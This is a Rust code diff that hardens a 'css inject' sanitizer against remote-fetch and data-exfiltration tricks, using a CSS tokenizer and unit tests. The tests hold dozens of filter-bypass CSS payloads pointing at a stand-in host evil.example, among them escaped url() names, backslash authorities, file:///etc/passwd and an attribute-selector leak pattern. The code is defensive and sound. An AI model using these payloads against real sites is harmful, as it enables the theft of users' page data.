@@ -703,71 +703,270 @@ pub fn sanitize_css_color(color: &str) -> Result<String, String> {
     Ok(s.to_string())
 }
 
-/// Strip CSS `/* ... */` comments so a scan cannot be evaded by hiding `@import`/`url(`
-/// inside a comment that the browser's CSS parser ignores.
-fn strip_css_comments(css: &str) -> String {
-    let bytes = css.as_bytes();
-    let mut out = String::with_capacity(css.len());
-    let mut i = 0;
-    while i < bytes.len() {
-        if i + 1 < bytes.len() && bytes[i] == b'/' && bytes[i + 1] == b'*' {
-            i += 2;
-            while i + 1 < bytes.len() && !(bytes[i] == b'*' && bytes[i + 1] == b'/') {
-                i += 1;
+// ── `css inject` anti-exfiltration check (R5B-CSS1) ─────────────────────────
+//
+// A real (if minimal) CSS tokenizer, per CSS Syntax Level 3, rather than substring scans over a
+// comment-stripped copy: stripping comments first let a `/*` inside a string or an unquoted
+// `url(...)` swallow a real remote `url()` that followed it, and a substring scan cannot tell a
+// URL position from text. The URL checks are an ALLOWLIST: in a URL position only `data:` and
+// scheme-less, same-origin references pass.
+
+/// Functions whose string arguments are URLs (`url("…")`, `src("…")`, `image-set("…" 1x)`, …).
+/// A string anywhere inside one of these (at any nesting depth) is checked as a URL.
+const CSS_URL_FUNCTIONS: &[&str] = &[
+    "url",
+    "src",
+    "image-set",
+    "-webkit-image-set",
+    "image",
+    "-webkit-image",
+    "cross-fade",
+    "-webkit-cross-fade",
+];
+
+/// Schemes the URL parser treats as "special": for these, `https:host/x` (no slashes) and
+/// backslashes still reach a remote host.
+const SPECIAL_URL_SCHEMES: &[&str] = &["http", "https", "ws", "wss", "ftp", "file"];
+
+/// CSS input preprocessing: CR, CRLF and FF become LF; NUL becomes U+FFFD.
+fn css_preprocess(css: &str) -> Vec<char> {
+    let mut out = Vec::with_capacity(css.len());
+    let mut chars = css.chars().peekable();
+    while let Some(c) = chars.next() {
+        match c {
+            '\r' => {
+                if chars.peek() == Some(&'\n') {
+                    chars.next();
+                }
+                out.push('\n');
             }
-            i = (i + 2).min(bytes.len());
-        } else {
-            out.push(bytes[i] as char);
-            i += 1;
+            '\u{0C}' => out.push('\n'),
+            '\0' => out.push('\u{FFFD}'),
+            _ => out.push(c),
         }
     }
     out
 }
 
-/// Decode CSS escape sequences so an obfuscated `\40 import` / `\75 rl(` / `\2f\2f`
-/// can't slip past a literal-string scan that the browser's CSS parser would still
-/// decode and act on. Handles the two CSS escape forms: `\` + 1–6 hex digits
-/// (optionally followed by one whitespace) → that code point, and `\` + any other
-/// char → that char literally. A trailing lone `\` is dropped.
-fn decode_css_escapes(css: &str) -> String {
-    let mut out = String::with_capacity(css.len());
-    let mut chars = css.chars().peekable();
-    while let Some(c) = chars.next() {
-        if c != '\\' {
-            out.push(c);
-            continue;
-        }
-        // Collect up to 6 hex digits.
-        let mut hex = String::new();
-        while hex.len() < 6 && chars.peek().is_some_and(char::is_ascii_hexdigit) {
-            hex.push(chars.next().unwrap());
-        }
-        if hex.is_empty() {
-            // `\` + non-hex → literal next char (e.g. `\@` → `@`); lone `\` dropped.
-            if let Some(next) = chars.next() {
-                out.push(next);
+fn css_is_ws(c: char) -> bool {
+    matches!(c, ' ' | '\t' | '\n')
+}
+
+fn css_is_ident_start(c: char) -> bool {
+    c.is_ascii_alphabetic() || c == '_' || !c.is_ascii()
+}
+
+fn css_is_ident_char(c: char) -> bool {
+    css_is_ident_start(c) || c.is_ascii_digit() || c == '-'
+}
+
+/// Tokenizer over preprocessed CSS, tracking only what the URL check needs.
+struct CssUrlScanner {
+    chars: Vec<char>,
+    pos: usize,
+}
+
+impl CssUrlScanner {
+    fn at(&self, offset: usize) -> Option<char> {
+        self.chars.get(self.pos + offset).copied()
+    }
+
+    /// `\` followed by anything but a newline (or EOF) starts an escape.
+    fn valid_escape_at(&self, offset: usize) -> bool {
+        self.at(offset) == Some('\\') && self.at(offset + 1).is_some_and(|c| c != '\n')
+    }
+
+    fn starts_ident_at(&self, offset: usize) -> bool {
+        match self.at(offset) {
+            Some('-') => {
+                self.at(offset + 1)
+                    .is_some_and(|c| css_is_ident_start(c) || c == '-')
+                    || self.valid_escape_at(offset + 1)
             }
-        } else {
-            // One optional trailing whitespace terminates a hex escape.
-            if chars.peek().is_some_and(char::is_ascii_whitespace) {
-                chars.next();
+            Some('\\') => self.valid_escape_at(offset),
+            Some(c) => css_is_ident_start(c),
+            None => false,
+        }
+    }
+
+    /// Consume an escape; `pos` is just past the backslash.
+    fn consume_escape(&mut self) -> char {
+        let Some(c) = self.at(0) else {
+            return '\u{FFFD}';
+        };
+        if !c.is_ascii_hexdigit() {
+            self.pos += 1;
+            return c;
+        }
+        let mut value: u32 = 0;
+        let mut digits = 0;
+        while digits < 6 {
+            match self.at(0).and_then(|d| d.to_digit(16)) {
+                Some(d) => {
+                    value = value * 16 + d;
+                    digits += 1;
+                    self.pos += 1;
+                }
+                None => break,
             }
-            match u32::from_str_radix(&hex, 16).ok().and_then(char::from_u32) {
-                Some(decoded) => out.push(decoded),
-                None => out.push('\u{FFFD}'),
+        }
+        if self.at(0).is_some_and(css_is_ws) {
+            self.pos += 1;
+        }
+        // 0, surrogates and out-of-range code points are U+FFFD.
+        match char::from_u32(value) {
+            Some(ch) if value != 0 => ch,
+            _ => '\u{FFFD}',
+        }
+    }
+
+    fn consume_ident(&mut self) -> String {
+        let mut out = String::new();
+        loop {
+            match self.at(0) {
+                Some(c) if css_is_ident_char(c) => {
+                    out.push(c);
+                    self.pos += 1;
+                }
+                Some('\\') if self.valid_escape_at(0) => {
+                    self.pos += 1;
+                    out.push(self.consume_escape());
+                }
+                _ => return out,
             }
         }
     }
-    out
+
+    /// Consume a string token's value; `pos` is just past the opening quote.
+    fn consume_string(&mut self, quote: char) -> String {
+        let mut out = String::new();
+        loop {
+            match self.at(0) {
+                None => return out,
+                Some(c) if c == quote => {
+                    self.pos += 1;
+                    return out;
+                }
+                // An unescaped newline ends a (bad) string; it is not consumed.
+                Some('\n') => return out,
+                Some('\\') => {
+                    self.pos += 1;
+                    match self.at(0) {
+                        None => {}
+                        Some('\n') => self.pos += 1, // line continuation
+                        Some(_) => out.push(self.consume_escape()),
+                    }
+                }
+                Some(c) => {
+                    out.push(c);
+                    self.pos += 1;
+                }
+            }
+        }
+    }
+
+    /// Consume an unquoted `url(` token's value up to `)` / EOF, decoding escapes. A bad-url
+    /// token (whitespace inside, a quote, `(`) is consumed to the same end point the browser
+    /// uses and still checked, which only errs toward rejecting.
+    fn consume_url(&mut self) -> String {
+        let mut out = String::new();
+        loop {
+            match self.at(0) {
+                None => return out,
+                Some(')') => {
+                    self.pos += 1;
+                    return out;
+                }
+                Some('\\') if self.valid_escape_at(0) => {
+                    self.pos += 1;
+                    out.push(self.consume_escape());
+                }
+                Some(c) => {
+                    out.push(c);
+                    self.pos += 1;
+                }
+            }
+        }
+    }
+}
+
+/// The URL parser's view of a CSS URL value: tabs and newlines removed anywhere, leading and
+/// trailing C0 controls and spaces trimmed.
+fn css_url_normalize(raw: &str) -> String {
+    let no_tab_nl: String = raw
+        .chars()
+        .filter(|c| !matches!(c, '\t' | '\n' | '\r'))
+        .collect();
+    no_tab_nl.trim_matches(|c: char| c <= '\u{20}').to_string()
+}
+
+/// The scheme of a normalized URL (ASCII alpha, then alphanumerics / `+` / `-` / `.`, then
+/// `:`), lowercased, and the rest after the colon.
+fn css_url_scheme(url: &str) -> Option<(String, &str)> {
+    let mut chars = url.char_indices();
+    let (_, first) = chars.next()?;
+    if !first.is_ascii_alphabetic() {
+        return None;
+    }
+    for (i, c) in chars {
+        if c == ':' {
+            return Some((url[..i].to_ascii_lowercase(), &url[i + 1..]));
+        }
+        if !(c.is_ascii_alphanumeric() || matches!(c, '+' | '-' | '.')) {
+            return None;
+        }
+    }
+    None
+}
+
+/// Starts with two of `/` and `\` (a network-path reference; special schemes read `\` as `/`).
+fn css_starts_with_authority(s: &str) -> bool {
+    let mut it = s.chars();
+    matches!((it.next(), it.next()), (Some('/' | '\\'), Some('/' | '\\')))
+}
+
+/// Check one URL-bearing value. `strict` (a URL position): only `data:` or a scheme-less
+/// same-origin reference passes. Otherwise (a string that is not in a URL position, but could
+/// reach one through `var()`): reject anything that can name a remote host.
+fn css_check_url(raw: &str, strict: bool) -> Result<(), String> {
+    let url = css_url_normalize(raw);
+    let remote = if css_starts_with_authority(&url) {
+        true
+    } else if let Some((scheme, rest)) = css_url_scheme(&url) {
+        if strict {
+            scheme != "data"
+        } else {
+            SPECIAL_URL_SCHEMES.contains(&scheme.as_str()) || css_starts_with_authority(rest)
+        }
+    } else {
+        false
+    };
+    if remote {
+        return Err(format!(
+            "a non-local URL is blocked in injected CSS (`{}` could fetch a remote origin — a \
+             data-exfiltration vector). Only relative and data: URLs are allowed; pass \
+             `allow_remote: true` to opt in.",
+            url.chars().take(80).collect::<String>()
+        ));
+    }
+    Ok(())
 }
 
 /// Validate CSS submitted to `css inject` before it is added to the page. By default this
-/// rejects two remote-fetch vectors that turn a debugging tool into a data-exfiltration /
-/// `SSRF` channel (especially dangerous when chained with prompt injection from page-sourced
-/// content): `@import` (pulls a remote stylesheet) and `url(...)` pointing at a remote
-/// origin (`http(s)://`, protocol-relative `//host`, or any `scheme://`). Relative refs,
-/// `data:` URIs, and `#fragment` refs are allowed. Set `allow_remote` to opt back in to
-/// remote references when intentionally needed.
+/// rejects every construct that could fetch from a remote origin — a data-exfiltration / SSRF
+/// channel, especially when chained with prompt injection from page-sourced content:
+///
+/// - `@import` in any form (it pulls a stylesheet);
+/// - an unquoted `url(...)` or a string inside `url()`, `src()`, `image-set()` /
+///   `-webkit-image-set()`, `image()`, `cross-fade()` that is not `data:` or a scheme-less
+///   relative reference (`//host`, `\\host`, `https:host`, `blob:`, … are all rejected);
+/// - any other string that names a remote host (`http(s)`/`ws(s)`/`ftp`/`file` scheme, or a
+///   `//host` form), since a custom property can carry it into an image function via `var()`.
+///
+/// Comments, strings and escapes are tokenized as the browser does, so an escaped name
+/// (`\75 rl(`), an escaped backslash (`\5c`), or a `/*` inside a string cannot hide a URL.
+/// Relative refs, `data:` URIs, and `#fragment` refs are allowed. Set `allow_remote` to opt
+/// back in to remote references when intentionally needed.
 ///
 /// # Errors
 /// Returns an error describing the rejected construct (or oversize input).
@@ -782,39 +981,66 @@ pub fn sanitize_injected_css(css: &str, allow_remote: bool) -> Result<(), String
     if allow_remote {
         return Ok(());
     }
-    // Strip comments, then DECODE escapes, then lowercase — so `\40 import` and
-    // `\75 rl(` (and an escaped `\2f\2f` remote URL) are normalized to the forms
-    // the scan below matches, closing the CSS-escape bypass.
-    let scan = decode_css_escapes(&strip_css_comments(css)).to_ascii_lowercase();
-    if scan.contains("@import") {
-        return Err(
-            "`@import` is blocked in injected CSS (it fetches a remote stylesheet — \
-                    a data-exfiltration vector). Inline the rules, or pass `allow_remote: true`."
-                .to_string(),
-        );
-    }
-    // Inspect every `url(...)` argument for a remote target.
-    let bytes = scan.as_bytes();
-    let mut search_from = 0;
-    while let Some(rel) = scan[search_from..].find("url(") {
-        let arg_start = search_from + rel + 4;
-        let arg_end = scan[arg_start..]
-            .find(')')
-            .map_or(scan.len(), |e| arg_start + e);
-        let arg = bytes[arg_start..arg_end]
-            .iter()
-            .map(|&b| b as char)
-            .collect::<String>();
-        let trimmed = arg.trim().trim_matches(['\'', '"']).trim();
-        if trimmed.starts_with("//") || trimmed.contains("://") {
-            return Err(format!(
-                "remote `url(...)` is blocked in injected CSS (`{}` would fetch a remote \
-                 origin — a data-exfiltration vector). Use a relative or data: URL, or pass \
-                 `allow_remote: true`.",
-                trimmed.chars().take(80).collect::<String>()
-            ));
+    let mut s = CssUrlScanner {
+        chars: css_preprocess(css),
+        pos: 0,
+    };
+    // Open functions / parentheses, innermost last (lowercased names; "" for a bare `(`).
+    let mut open: Vec<String> = Vec::new();
+    let in_url_function =
+        |open: &[String]| open.iter().any(|f| CSS_URL_FUNCTIONS.contains(&f.as_str()));
+    while let Some(c) = s.at(0) {
+        match c {
+            '/' if s.at(1) == Some('*') => {
+                s.pos += 2;
+                while s.pos < s.chars.len() && !(s.at(0) == Some('*') && s.at(1) == Some('/')) {
+                    s.pos += 1;
+                }
+                s.pos = (s.pos + 2).min(s.chars.len());
+            }
+            '"' | '\'' => {
+                s.pos += 1;
+                let value = s.consume_string(c);
+                css_check_url(&value, in_url_function(&open))?;
+            }
+            '@' if s.starts_ident_at(1) => {
+                s.pos += 1;
+                if s.consume_ident().eq_ignore_ascii_case("import") {
+                    return Err(
+                        "`@import` is blocked in injected CSS (it fetches a stylesheet — a \
+                         data-exfiltration vector). Inline the rules, or pass `allow_remote: true`."
+                            .to_string(),
+                    );
+                }
+            }
+            '(' => {
+                s.pos += 1;
+                open.push(String::new());
+            }
+            ')' => {
+                s.pos += 1;
+                open.pop();
+            }
+            _ if s.starts_ident_at(0) => {
+                let name = s.consume_ident().to_ascii_lowercase();
+                if s.at(0) == Some('(') {
+                    s.pos += 1;
+                    let mut ahead = 0;
+                    while s.at(ahead).is_some_and(css_is_ws) {
+                        ahead += 1;
+                    }
+                    if name == "url" && !matches!(s.at(ahead), Some('"' | '\'')) {
+                        // An unquoted url token: always a URL position.
+                        s.pos += ahead;
+                        let value = s.consume_url();
+                        css_check_url(&value, true)?;
+                    } else {
+                        open.push(name);
+                    }
+                }
+            }
+            _ => s.pos += 1,
         }
-        search_from = arg_end;
     }
     Ok(())
 }
@@ -984,6 +1210,115 @@ mod injected_css_tests {
         // A legitimately-escaped local content value must still pass.
         assert!(sanitize_injected_css("a::before{content:'\\2022'}", false).is_ok());
         assert!(sanitize_injected_css("body{color:red}", false).is_ok());
+    }
+
+    /// R5B-CSS1: every construct below resolves to a REMOTE origin in a real webview (WHATWG
+    /// URL parsing against `tauri://localhost` / `http://tauri.localhost`), so each must be
+    /// rejected. The old check only looked for a leading `//` or a `://` inside `url(...)`.
+    #[test]
+    fn r5b_css1_rejects_every_remote_form() {
+        let remote = [
+            // A special scheme needs no slashes: `https:evil.example/x` is https://evil.example/x.
+            r"body{background:url(https:evil.example/x)}",
+            r"body{background:url(HTTPS:evil.example/x)}",
+            r"body{background:url(http:/evil.example/x)}",
+            r#"body{background:url("https:evil.example/x")}"#,
+            // `\5c` is a backslash, which special schemes read as `/`.
+            r#"body{background:url("https:\5c\5c evil.example/x")}"#,
+            r"body{background:url(\5c\5c evil.example/x)}",
+            // (`\\` is an escaped backslash; a lone `\e` would be a hex escape.)
+            r"body{background:url(/\\evil.example/x)}",
+            r"body{background:url(\\/evil.example/x)}",
+            r"body{background:url(\\\\evil.example/x)}",
+            // Tabs / newlines are removed anywhere by the URL parser.
+            "body{background:url(\"ht\\9 tps://evil.example/x\")}",
+            "body{background:url(\"ht\\a tps://evil.example/x\")}",
+            "body{background:url(\" //evil.example/x\")}",
+            // Any scheme other than data: in a URL position.
+            r"body{background:url(ws:evil.example)}",
+            r"body{background:url(file:///etc/passwd)}",
+            r"body{background:url(blob:https://evil.example/uuid)}",
+            r"body{background:url(javascript:alert(1))}",
+            // Image functions take bare strings as URLs.
+            r#"body{background-image:image-set("https://evil.example/x" 1x)}"#,
+            r#"input[value^=a]{background:-webkit-image-set("//evil.example/a" 1x)}"#,
+            r#"body{background-image:image-set("https:evil.example/x" 1x)}"#,
+            r#"body{background-image:image("https://evil.example/x")}"#,
+            r#"body{background-image:cross-fade("https://evil.example/x", url(a.png) 50%)}"#,
+            r#"body{background-image:-webkit-cross-fade("//evil.example/x", url(a.png), 50%)}"#,
+            r#"body{background-image:src("https://evil.example/x")}"#,
+            r#"body{background-image:image-set(type("image/png") "https://evil.example/x")}"#,
+            // Escaped / uppercased function names.
+            r#"body{background-image:IMAGE-SET("https://evil.example/x" 1x)}"#,
+            r#"body{background-image:\69 mage-set("https://evil.example/x" 1x)}"#,
+            r"body{background-image:U\52 L(https://evil.example/x)}",
+            // A string reaching an image function through a custom property.
+            r#":root{--u:"https://evil.example/x"} body{background:image-set(var(--u) 1x)}"#,
+            r#":root{--u:"//evil.example/x"}"#,
+            // `@import` in any form.
+            r#"@import "a.css";"#,
+            r"@IMPORT url(a.css);",
+            r#"@\69mport "a.css";"#,
+            // A comment opener inside a string / url must not hide what follows it.
+            r#"a{content:"/*"} body{background:url(https://evil.example/x)} b{content:"*/"}"#,
+            r"a{background:url(x/*)} body{background:url(https://evil.example/x)} /**/",
+            // Unterminated url at EOF is still a url token.
+            r"body{background:url(https://evil.example/x",
+            // A NUL is U+FFFD to CSS; escaped NUL too — neither hides the scheme after it.
+            "body{background:url(\"x\") url(https://evil.example/\u{0})}",
+        ];
+        for css in remote {
+            assert!(
+                sanitize_injected_css(css, false).is_err(),
+                "must be rejected: {css}"
+            );
+            // The opt-in still lets it through.
+            assert!(sanitize_injected_css(css, true).is_ok(), "{css}");
+        }
+    }
+
+    #[test]
+    fn r5b_css1_keeps_legitimate_css_working() {
+        let local = [
+            "body{color:red}",
+            "a:hover{outline:2px solid #f00 !important}",
+            "@media (max-width: 600px){.x{display:none}}",
+            "@keyframes k{from{opacity:0}to{opacity:1}}",
+            "@supports (display:grid){.g{display:grid}}",
+            r"body{background:url(/assets/x.png)}",
+            r"body{background:url(./x.png)}",
+            r"body{background:url(../img/x.png)}",
+            r"body{background:url(x.png?a=b#c)}",
+            r#"body{background:url("img/x y.png")}"#,
+            r"body{background:url(#grad)}",
+            r"body{background:url()}",
+            r#"body{background:url("")}"#,
+            r"body{background:url(DATA:image/png;base64,AAAA)}",
+            r#"body{background:url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg'/>")}"#,
+            r#"body{background-image:image-set("a.png" 1x, "a@2x.png" 2x)}"#,
+            r#"body{background-image:image-set(url(a.png) type("image/png") 1x)}"#,
+            r#"@font-face{font-family:X;src:local("Arial Bold"),url(f.woff2) format("woff2")}"#,
+            r#"a::before{content:"Warning: see docs"}"#,
+            r#"a::before{content:"https is fine as text, not a URL"}"#,
+            r#"a::after{content:"w: 100px"}"#,
+            r#"q{quotes:"«" "»"}"#,
+            r#"body{font-family:"Segoe UI", sans-serif}"#,
+            r#".g{grid-template-areas:"a b" "c d"}"#,
+            r"a::before{content:'\2022'}",
+            // Comments anywhere, including ones that look like URLs.
+            "/* https://evil.example */ body{color:red}",
+            // `@import` as text is not an import.
+            r#"a::before{content:"@import is blocked"}"#,
+            // An ident merely containing `url`.
+            r"body{--my-url:1px; transition:myurl(1s)}",
+        ];
+        for css in local {
+            assert!(
+                sanitize_injected_css(css, false).is_ok(),
+                "must be allowed: {css} => {:?}",
+                sanitize_injected_css(css, false)
+            );
+        }
     }
 }
 
